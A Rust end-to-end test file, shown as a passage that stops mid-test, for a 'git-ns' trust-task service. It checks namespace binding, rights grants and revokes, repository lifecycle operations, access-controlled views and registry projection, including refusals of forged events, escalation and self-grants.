//! End-to-end tests of the `git-ns/*` family through the dispatch spine:
//! signed documents in, the specification's codes and records out.
//!
//! Test names cite what they hold — the fixed rule, or the task's numbered
//! *Request* step.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};
use trust_tasks_rs::TrustTask;
use trust_tasks_rs::specs::git_ns::bridge::job::v0_4 as job_wire;
use trust_tasks_rs::specs::git_ns::namespace::reseat::v0_3 as reseat3;
use vti_rooms_dtg::test_support::Party;

use crate::acl::{VtcAclEntry, VtcRole, store_acl_entry};
use crate::registry::MockRegistryClient;
use crate::server::AppState;
use crate::test_support::{TEST_VTC_DID, TestVtc};
use crate::trust_tasks::{JoinAuthCtx, TrustTaskOutcome, dispatch_trust_task_core};

use super::GitNsConfig;
use super::bridge::{BridgeClient, BridgeSendError};
use super::model::{RepoState, Scope};
use super::projection::{self, Backoff};
use super::store::{self, Snapshot};

const URI: &str = "https://trusttasks.org/spec/git-ns";
/// `git-ns/namespace/reseat/0.3`, the only reseat version served.
const RESEAT_URI: &str = <reseat3::Payload as trust_tasks_rs::Payload>::TYPE_URI;

/// The version of each task this VTC serves: grant and revoke only at 0.3
/// (0.1 is not served), everything else at 0.1.
fn uri(task: &str) -> String {
    let version = match task {
        "right/grant" | "right/revoke" | "repo/create" => "0.3",
        _ => "0.1",
    };
    format!("{URI}/{task}/{version}")
}

#[test]
fn reseat_0_3_requires_a_proof_and_a_did_core_subject() {
    const { assert!(<reseat3::Payload as trust_tasks_rs::Payload>::IS_PROOF_REQUIRED) };
    let p: reseat3::Payload = serde_json::from_value(json!({
        "namespace": "ns_1", "subject": "did:key:z6Mkcarol", "statement": "why"
    }))
    .unwrap();
    assert_eq!(p.subject.to_string(), "did:key:z6Mkcarol");
    assert!(
        serde_json::from_value::<reseat3::Payload>(json!({
            "namespace": "ns_1", "subject": "did:key:z6Mk#frag", "statement": "why"
        }))
        .is_err()
    );
}

/// A bridge that accepts every job and remembers them.
#[derive(Default)]
struct FakeBridge {
    jobs: Mutex<Vec<(String, Value)>>,
    /// When set, the bridge reports each job's result *while* its send is
    /// still in flight — the race the dispatcher's write-back must survive.
    race: Mutex<Option<vti_common::store::KeyspaceHandle>>,
    /// When set, the bridge predates `git-ns/bridge/job` 0.4: it answers
    /// `trust-task-discovery` with `unsupportedType`, as a bridge that
    /// handles only jobs does, and refuses a 0.4 job the same way.
    pre_v0_4: Mutex<bool>,
    /// The type URI each job in `jobs` was sent as.
    types: Mutex<Vec<String>>,
    /// Discovery requests answered.
    discoveries: Mutex<u32>,
}

#[async_trait]
impl BridgeClient for FakeBridge {
    async fn discover_jobs(
        &self,
        _bridge_did: &str,
        _timeout: Duration,
    ) -> Result<Vec<String>, BridgeSendError> {
        *self.discoveries.lock().unwrap() += 1;
        if *self.pre_v0_4.lock().unwrap() {
            return Err(BridgeSendError::Rejected {
                code: "unsupportedType".into(),
                message: "this bridge handles git-ns/bridge/job only".into(),
            });
        }
        Ok(vec![super::bridge::JOB_TYPE.into()])
    }

    async fn send_job(
        &self,
        bridge_did: &str,
        type_uri: &str,
        payload: &Value,
        _timeout: Duration,
    ) -> Result<job_wire::Response, BridgeSendError> {
        if *self.pre_v0_4.lock().unwrap() {
            return Err(BridgeSendError::Rejected {
                code: "unsupportedType".into(),
                message: "this bridge handles git-ns/bridge/job 0.1 and 0.2".into(),
            });
        }
        self.jobs
            .lock()
            .unwrap()
            .push((bridge_did.to_string(), payload.clone()));
        self.types.lock().unwrap().push(type_uri.to_string());
        let racing = self.race.lock().unwrap().clone();
        if let Some(ks) = racing
            && let Some(id) = payload["jobId"].as_str()
            && let Some(mut job) = super::bridge::get_job(&ks, id).await.unwrap()
        {
            job.state = super::bridge::JobState::Succeeded;
            job.result = Some(json!({ "jobId": id, "outcome": "succeeded" }));
            super::bridge::put_job(&ks, &job).await.unwrap();
        }
        let mut ack = json!({ "jobId": payload["jobId"], "accepted": true });
        if matches!(
            payload["kind"].as_str(),
            Some("beginBind" | "beginAccountLink")
        ) {
            ack["next"] = json!({
                "url": "https://github.com/apps/acme-vgi/installations/new?state=nonce",
                "expiresAt": "2099-01-01T00:00:00Z",
            });
        }
        Ok(serde_json::from_value(ack).unwrap())
    }
}

struct Fixture {
    vtc: TestVtc,
    bridge: Arc<FakeBridge>,
    admin: Party,
    bob: Party,
    carol: Party,
    stranger: Party,
    bridge_party: Party,
}

async fn seed_acl(state: &AppState, did: &str, role: VtcRole) {
    store_acl_entry(
        &state.acl_ks,
        &VtcAclEntry {
            did: did.into(),
            role,
            label: None,
            allowed_contexts: vec![],
            created_at: 0,
            created_by: "test".into(),
            updated_at: None,
            updated_by: None,
            expires_at: None,
        },
    )
    .await
    .unwrap();
    crate::members::store_member(&state.members_ks, &crate::members::Member::fresh(did))
        .await
        .unwrap();
}

async fn fixture_with(config: GitNsConfig) -> Fixture {
    let bridge = Arc::new(FakeBridge::default());
    let bridge_party = Party::new();
    let mut config = config;
    config
        .bridges
        .insert("github.com".into(), bridge_party.did.clone());
    let vtc = TestVtc::builder()
        .with_audit(true)
        .with_signers(true)
        .with_git_ns_bridge(bridge.clone())
        .with_git_ns_config(config)
        .build()
        .await;
    crate::policy::default::install_defaults(&vtc.state.policies_ks, &vtc.state.active_policies_ks)
        .await
        .unwrap();
    let f = Fixture {
        vtc,
        bridge,
        admin: Party::new(),
        bob: Party::new(),
        carol: Party::new(),
        stranger: Party::new(),
        bridge_party,
    };
    seed_acl(&f.vtc.state, &f.admin.did, VtcRole::Admin).await;
    seed_acl(&f.vtc.state, &f.bob.did, VtcRole::Member).await;
    seed_acl(&f.vtc.state, &f.carol.did, VtcRole::Member).await;
    f
}

async fn fixture() -> Fixture {
    fixture_with(GitNsConfig::default()).await
}

async fn send(state: &AppState, who: &Party, task: &str, payload: Value) -> TrustTaskOutcome {
    let mut doc: TrustTask<Value> =
        vta_sdk::trust_task_sign::build_unsigned(&uri(task), payload, &who.did, TEST_VTC_DID)
            .unwrap();
    let key =
        vta_sdk::trust_task_sign::HolderKey::from_did_key(&who.did, &who.secret_multibase).unwrap();
    vta_sdk::trust_task_sign::sign_in_place_with(&mut doc, &key)
        .await
        .unwrap();
    let body = serde_json::to_vec(&doc).unwrap();
    dispatch_trust_task_core(state, &JoinAuthCtx::rest(), &body).await
}

fn payload(out: &TrustTaskOutcome) -> Value {
    let doc: Value = serde_json::from_slice(&out.body).unwrap();
    doc["payload"].clone()
}

fn message(out: &TrustTaskOutcome) -> String {
    payload(out)["message"]
        .as_str()
        .unwrap_or_default()
        .to_string()
}

fn code(out: &TrustTaskOutcome) -> String {
    let p = payload(out);
    assert!(
        p.get("code").is_some(),
        "expected an error, got {}",
        String::from_utf8_lossy(&out.body)
    );
    p["code"].as_str().unwrap().to_string()
}

fn ok(out: &TrustTaskOutcome) -> Value {
    assert!(
        out.status.is_success() && payload(out).get("code").is_none(),
        "expected success, got {} {}",
        out.status,
        String::from_utf8_lossy(&out.body)
    );
    payload(out)
}

/// Bind `github.com/acme` in manual mode as the admin; returns its id.
async fn bind_manual(f: &Fixture) -> String {
    let out = send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "manual" }),
    )
    .await;
    ok(&out)["namespace"]["id"].as_str().unwrap().to_string()
}

async fn grant(
    f: &Fixture,
    actor: &Party,
    subject: &str,
    right: &str,
    resource: &str,
) -> TrustTaskOutcome {
    send(
        &f.vtc.state,
        actor,
        "right/grant",
        json!({ "subject": subject, "right": right, "resource": resource }),
    )
    .await
}

// ── namespace/bind, unbind ──────────────────────────────────────────────────

#[tokio::test]
async fn bind_manual_is_bound_at_once_and_the_binder_is_its_admin() {
    let f = fixture().await;
    let id = bind_manual(&f).await;
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.namespace(&id).unwrap();
    assert_eq!(ns.state, super::model::NamespaceState::Bound);
    assert_eq!(
        super::rules::admins(&snap, &id, super::ops::now()),
        vec![f.admin.did.clone()]
    );
}

#[tokio::test]
async fn bind_item_1_needs_the_community_administrator_capability() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.bob,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "manual" }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

#[tokio::test]
async fn bind_item_2_refuses_an_owner_already_bound() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "manual" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/namespace/bind:alreadyBound");
}

#[tokio::test]
async fn bind_item_4_refuses_bridge_mode_with_no_bridge_for_the_forge() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "codeberg.org", "owner": "acme", "mode": "bridge" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/namespace/bind:noBridge");
}

#[tokio::test]
async fn bind_bridge_is_pending_until_the_bridge_reports_the_proof() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "namespace/bind",
        json!({ "forge": "github.com", "owner": "acme", "mode": "bridge" }),
    )
    .await;
    let body = ok(&out);
    assert_eq!(body["namespace"]["state"], "pending");
    assert!(
        body["next"]["url"]
            .as_str()
            .unwrap()
            .contains("state=nonce")
    );
    let ns_id = body["namespace"]["id"].as_str().unwrap().to_string();
    let job_id = f.bridge.jobs.lock().unwrap()[0].1["jobId"]
        .as_str()
        .unwrap()
        .to_string();

    // Nothing is granted in a pending namespace.
    let refused = grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&refused), "git-ns:namespaceNotBound");

    // Only the serving bridge may complete it.
    let event = json!({
        "namespace": ns_id,
        "event": { "type": "bindCompleted", "jobId": job_id, "ownerId": "91827364", "kind": "organization" },
    });
    let forged = send(&f.vtc.state, &f.stranger, "bridge/event", event.clone()).await;
    assert_eq!(code(&forged), "permissionDenied");

    ok(&send(&f.vtc.state, &f.bridge_party, "bridge/event", event.clone()).await);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.namespace(&ns_id).unwrap();
    assert_eq!(ns.state, super::model::NamespaceState::Bound);
    assert_eq!(ns.owner_id.as_deref(), Some("91827364"));
    assert_eq!(
        super::rules::admins(&snap, &ns_id, super::ops::now()),
        vec![f.admin.did.clone()],
        "the administrator who asked receives git.ns.admin"
    );

    // A replayed completion finds no pending binding.
    let again = send(&f.vtc.state, &f.bridge_party, "bridge/event", event).await;
    assert_eq!(code(&again), "permissionDenied");
}

#[tokio::test]
async fn an_event_for_an_unknown_namespace_is_refused() {
    let f = fixture().await;
    let out = send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/event",
        json!({ "namespace": "ns_nope", "event": { "type": "installationRemoved" } }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:unknownNamespace");
}

#[tokio::test]
async fn unbind_revokes_everything_and_detaches_every_repository() {
    let f = fixture_with(GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    })
    .await;
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await);
    let out = send(
        &f.vtc.state,
        &f.admin,
        "namespace/unbind",
        json!({ "namespace": ns }),
    )
    .await;
    let body = ok(&out);
    assert_eq!(body["rightsRevoked"], 3, "ns.admin, repo.create, own");
    assert_eq!(body["reposDetached"], 1);
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(snap.namespace(&ns).is_none());
    assert!(snap.rights.is_empty());
    assert!(snap.repos.iter().all(|r| r.state == RepoState::Detached));
}

// ── right/grant: the fixed rules ────────────────────────────────────────────

#[tokio::test]
async fn grant_rule_1_a_repository_right_on_a_namespace_is_a_scope_violation() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = grant(&f, &f.admin, &f.bob.did, "git.repo.own", "github.com/acme").await;
    assert_eq!(code(&out), "git-ns:scopeViolation");
}

#[tokio::test]
async fn grant_rule_2_repo_create_is_not_re_delegable() {
    let f = fixture().await;
    bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    let out = grant(
        &f,
        &f.bob,
        &f.carol.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "git-ns:escalation");
}

#[tokio::test]
async fn grant_rule_2_nothing_held_is_permission_denied() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = grant(
        &f,
        &f.bob,
        &f.carol.did,
        "git.commit.sign",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

#[tokio::test]
async fn grant_rule_5_namespace_rights_go_to_members_only() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = grant(
        &f,
        &f.admin,
        &f.stranger.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "git-ns:membersOnly");
}

#[tokio::test]
async fn grant_rule_6_the_default_policy_refuses_external_signers() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = grant(
        &f,
        &f.admin,
        &f.stranger.did,
        "git.commit.sign",
        "github.com/acme",
    )
    .await;
    assert_eq!(code(&out), "git-ns:policyDenied");
}

#[tokio::test]
async fn grant_item_2_a_resource_in_no_namespace_is_unknown() {
    let f = fixture().await;
    let out = grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.commit.sign",
        "codeberg.org/acme",
    )
    .await;
    assert_eq!(code(&out), "git-ns:unknownNamespace");
}

#[tokio::test]
async fn grant_item_3_an_unrecorded_repository_is_unknown() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.commit.sign",
        "github.com/acme/nope",
    )
    .await;
    assert_eq!(code(&out), "git-ns:unknownRepo");
}

#[tokio::test]
async fn grant_item_5_an_expiry_in_the_past_is_refused() {
    let f = fixture().await;
    bind_manual(&f).await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({
            "subject": f.bob.did, "right": "git.commit.sign", "resource": "github.com/acme",
            "expiresAt": "2020-01-01T00:00:00Z",
        }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/right/grant:expiryInPast");
}

#[tokio::test]
async fn grant_item_6_a_repeated_grant_returns_the_record_unchanged() {
    let f = fixture().await;
    bind_manual(&f).await;
    let first = ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.bob.did, "right": "git.commit.sign", "resource": "github.com/acme", "reason": "first" }),
    )
    .await);
    let second = ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/grant",
        json!({ "subject": f.bob.did, "right": "git.commit.sign", "resource": "github.com/acme", "reason": "second" }),
    )
    .await);
    assert_eq!(first["right"], second["right"]);
    assert_eq!(second["right"]["reason"], "first");
}

#[tokio::test]
async fn elevated_actions_fall_back_to_community_administrators() {
    // Design §6: `own` is elevated. With no member step-up, the default
    // configuration admits it only from a community administrator.
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await);
    // Bob owns gadgets and the rights model lets him name a co-owner …
    let out = grant(
        &f,
        &f.bob,
        &f.carol.did,
        "git.repo.own",
        "github.com/acme/gadgets",
    )
    .await;
    // … but the consent fallback does not.
    assert_eq!(code(&out), "permissionDenied");
    // A normal-class grant goes through.
    ok(&grant(
        &f,
        &f.bob,
        &f.carol.did,
        "git.commit.sign",
        "github.com/acme/gadgets",
    )
    .await);
}

// ── repo/create, adopt, transfer, archive ───────────────────────────────────

#[tokio::test]
async fn create_in_a_manual_namespace_reserves_and_returns_manual_steps() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    let out = send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await;
    let body = ok(&out);
    assert_eq!(body["repo"]["state"], "pendingCreate");
    assert_eq!(body["repo"]["owners"], json!([f.bob.did]));
    let steps = body["manualSteps"].as_array().unwrap();
    assert!(
        steps
            .last()
            .unwrap()
            .as_str()
            .unwrap()
            .contains("cnm git adopt")
    );

    let again = send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await;
    assert_eq!(code(&again), "git-ns/repo/create:nameTaken");

    // A reservation publishes nothing.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let want = projection::desired(&snap, super::ops::now());
    assert!(want.keys().all(|k| !k.contains("gadgets")));
}

#[tokio::test]
async fn create_needs_repo_create() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    let out = send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

/// `git-ns/repo/create/0.3`: a `git.repo.create` implied by `git.ns.admin`
/// carries no creator ownership. The binder of `acme` (its namespace admin)
/// creating without naming an owner would own the repository on their own
/// authority: refused, nothing reserved.
#[tokio::test]
async fn create_on_an_implied_repo_create_refuses_the_creator_as_owner() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    for body in [
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public", "owners": [f.admin.did, f.bob.did] }),
    ] {
        let out = send(&f.vtc.state, &f.admin, "repo/create", body).await;
        assert_eq!(code(&out), "git-ns:selfGrantNotAllowed");
        assert!(
            payload(&out)["message"]
                .as_str()
                .unwrap()
                .contains("break-glass")
        );
    }
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    assert!(
        snap.repo_at("github.com/acme/gadgets").is_none(),
        "nothing reserved"
    );
}

/// … and naming another member as owner works: the namespace admin may
/// grant `own`, so the create records it for Bob, granted by the admin.
#[tokio::test]
async fn create_on_an_implied_repo_create_may_name_another_owner() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public", "owners": [f.bob.did] }),
    )
    .await);
    assert_eq!(body["repo"]["owners"], json!([f.bob.did]));
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let repo = snap.repo_at("github.com/acme/gadgets").unwrap();
    let rows = snap.rows(&Scope::Repo(repo.id.clone()));
    assert!(rows.iter().any(|r| r.subject == f.bob.did
        && r.right == super::model::Right::RepoOwn
        && r.granted_by == f.admin.did));
    assert!(!rows.iter().any(|r| r.subject == f.admin.did));
    // An owner who is not a member is refused (fixed rule 5).
    let stranger = Party::new();
    let out = send(
        &f.vtc.state,
        &f.admin,
        "repo/create",
        json!({ "namespace": ns, "name": "sprockets", "visibility": "public", "owners": [stranger.did] }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:membersOnly");
}

/// An explicit `git.repo.create`, granted by someone else, keeps creator
/// ownership; a holder who cannot grant `own` names nobody else.
#[tokio::test]
async fn create_on_an_explicit_repo_create_makes_the_creator_owner() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    let body = ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await);
    assert_eq!(body["repo"]["owners"], json!([f.bob.did]));
    let out = send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "sprockets", "visibility": "public", "owners": [f.carol.did] }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:escalation");
}

/// A single-admin community breaks the glass once for `git.repo.create`;
/// what the admin creates on that record is theirs.
#[tokio::test]
async fn break_glass_repo_create_then_create_makes_the_creator_owner() {
    let f = fixture().await;
    let ns = bind_manual(&f).await;
    ok(&break_glass(&f, &f.admin, "git.repo.create", "github.com/acme").await);
    for name in ["gadgets", "sprockets"] {
        let body = ok(&send(
            &f.vtc.state,
            &f.admin,
            "repo/create",
            json!({ "namespace": ns, "name": name, "visibility": "public" }),
        )
        .await);
        assert_eq!(body["repo"]["owners"], json!([f.admin.did]), "{name}");
    }
}

/// Fixed rule 5 of `git-ns/right/grant/0.3`: an elevated right goes only to a
/// member with an ACL entry — a fresh `did:key` the actor controls is refused
/// — and `maintain` and `commit.sign` stay policy's to decide.
#[tokio::test]
async fn elevated_rights_go_only_to_members() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let sock_puppet = Party::new();
    for (right, on) in [
        ("git.repo.own", res.as_str()),
        ("git.repo.create", "github.com/acme"),
        ("git.ns.admin", "github.com/acme"),
    ] {
        let out = grant(&f, &f.admin, &sock_puppet.did, right, on).await;
        assert_eq!(code(&out), "git-ns:membersOnly", "{right}");
    }
    let out = send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": res, "to": sock_puppet.did }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:membersOnly");
    let out = send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/gadgets", "owners": [sock_puppet.did] }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:membersOnly");
}

#[tokio::test]
async fn adopt_activates_a_reservation_and_refuses_a_managed_repository() {
    let f = fixture_with(GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    })
    .await;
    let ns = bind_manual(&f).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.bob.did,
        "git.repo.create",
        "github.com/acme",
    )
    .await);
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/create",
        json!({ "namespace": ns, "name": "gadgets", "visibility": "public" }),
    )
    .await);
    // The reservation's owner finishes the job.
    let body = ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/adopt",
        json!({ "resource": "github.com/acme/gadgets", "owners": [f.carol.did] }),
    )
    .await);
    assert_eq!(body["repo"]["state"], "active");
    let owners = body["repo"]["owners"].as_array().unwrap();
    assert_eq!(owners.len(), 2, "existing owners are kept and these added");

    let again = send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/gadgets", "owners": [f.carol.did] }),
    )
    .await;
    assert_eq!(code(&again), "git-ns/repo/adopt:alreadyManaged");
}

async fn active_repo(f: &Fixture) -> String {
    let ns = bind_manual(f).await;
    let _ = ns;
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/adopt",
        json!({ "resource": "github.com/acme/widgets", "owners": [f.bob.did] }),
    )
    .await);
    "github.com/acme/widgets".into()
}

#[tokio::test]
async fn transfer_moves_ownership_in_one_change() {
    let f = fixture_with(GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    })
    .await;
    let res = active_repo(&f).await;
    let not_owner = send(
        &f.vtc.state,
        &f.carol,
        "repo/transfer",
        json!({ "resource": res, "to": f.bob.did }),
    )
    .await;
    assert_eq!(code(&not_owner), "git-ns/repo/transfer:notOwner");
    let selfie = send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": res, "to": f.bob.did }),
    )
    .await;
    assert_eq!(code(&selfie), "git-ns/repo/transfer:selfTransfer");
    let body = ok(&send(
        &f.vtc.state,
        &f.bob,
        "repo/transfer",
        json!({ "resource": res, "to": f.carol.did }),
    )
    .await);
    assert_eq!(body["repo"]["owners"], json!([f.carol.did]));
}

#[tokio::test]
async fn revoke_rules_3_and_4_keep_an_owner_and_an_admin() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.bob.did, "right": "git.repo.own", "resource": res }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:lastOwner");
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.admin.did, "right": "git.ns.admin", "resource": "github.com/acme" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:lastAdmin", "resignations too");
    let out = send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.commit.sign", "resource": res }),
    )
    .await;
    assert_eq!(code(&out), "git-ns/right/revoke:notGranted");
}

#[tokio::test]
async fn revoke_is_open_to_the_subject_and_closed_to_bystanders() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
    let bystander = send(
        &f.vtc.state,
        &f.stranger,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.commit.sign", "resource": res }),
    )
    .await;
    assert_eq!(code(&bystander), "permissionDenied");
    let body = ok(&send(
        &f.vtc.state,
        &f.carol,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.commit.sign", "resource": res }),
    )
    .await);
    assert_eq!(body["revoked"]["subject"], json!(f.carol.did));
}

#[tokio::test]
async fn archive_revokes_every_commit_right_and_is_idempotent() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/archive",
        json!({ "resource": res }),
    )
    .await);
    assert_eq!(body["repo"]["state"], "archived");
    assert_eq!(body["rightsRevoked"], 1);
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "repo/archive",
        json!({ "resource": res }),
    )
    .await);
    assert_eq!(body["rightsRevoked"], 0);

    // The owner record is kept; no commit right is published for it.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let want = projection::desired(&snap, super::ops::now());
    assert!(want.contains_key(&projection::tuple_key(&f.bob.did, "git.repo.own", &res)));
    assert!(!want.contains_key(&projection::tuple_key(&f.bob.did, "git.commit.sign", &res)));
}

// ── view ────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn view_shows_reasons_only_to_those_who_govern_the_resource() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.commit.sign", "resource": res, "reason": "1.0 push" }),
    )
    .await);

    // Carol sees her own right, without its reason.
    let carol = ok(&send(&f.vtc.state, &f.carol, "view", json!({})).await);
    let rights = carol["rights"].as_array().unwrap();
    assert_eq!(rights.len(), 1);
    assert!(rights[0].get("reason").is_none());
    assert_eq!(carol["repos"][0]["owners"], json!([f.bob.did]));

    // Bob owns the repository: every right on it, reasons included.
    let bob = ok(&send(&f.vtc.state, &f.bob, "view", json!({ "resource": res })).await);
    let reasons: Vec<&Value> = bob["rights"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|r| r.get("reason"))
        .collect();
    assert_eq!(reasons, vec![&json!("1.0 push")]);

    // A non-member is refused.
    let out = send(&f.vtc.state, &f.stranger, "view", json!({})).await;
    assert_eq!(code(&out), "permissionDenied");
}

// ── the projection ──────────────────────────────────────────────────────────

#[tokio::test]
async fn the_projection_publishes_implied_commit_rights_and_never_a_reason() {
    let f = fixture().await;
    let res = active_repo(&f).await;
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "right/grant",
        json!({ "subject": f.carol.did, "right": "git.repo.maintain", "resource": res, "reason": "secret" }),
    )
    .await);
    let registry = MockRegistryClient::new();
    let mut backoff = Backoff::default();
    let report = projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
    assert_eq!(report.failed, 0);
    let records = registry.trust_records().await;
    let has = |e: &str, a: &str, r: &str| records.contains_key(&projection::tuple_key(e, a, r));
    // ns.admin → commit.sign on the namespace (trust-tasks-tf#623).
    assert!(has(&f.admin.did, "git.ns.admin", "github.com/acme"));
    assert!(has(&f.admin.did, "git.commit.sign", "github.com/acme"));
    // own and maintain → commit.sign on the repository.
    assert!(has(&f.bob.did, "git.repo.own", &res));
    assert!(has(&f.bob.did, "git.commit.sign", &res));
    assert!(has(&f.carol.did, "git.repo.maintain", &res));
    assert!(has(&f.carol.did, "git.commit.sign", &res));
    // Implied rights other than commit.sign are never records.
    assert!(!has(&f.admin.did, "git.repo.own", &res));
    for record in records.values() {
        assert_eq!(record["authority_id"], TEST_VTC_DID);
        assert_eq!(record["record_type"], "authorization");
        assert!(record["context"].get("reason").is_none());
        assert!(!record.to_string().contains("secret"));
    }

    // A second pass changes nothing; a revoke withdraws the tuples.
    let again = projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
    assert_eq!((again.put, again.deleted), (0, 0));
    ok(&send(
        &f.vtc.state,
        &f.bob,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.repo.maintain", "resource": res }),
    )
    .await);
    let after = projection::reconcile(&f.vtc.state, &registry, TEST_VTC_DID, &mut backoff)
        .await
        .unwrap();
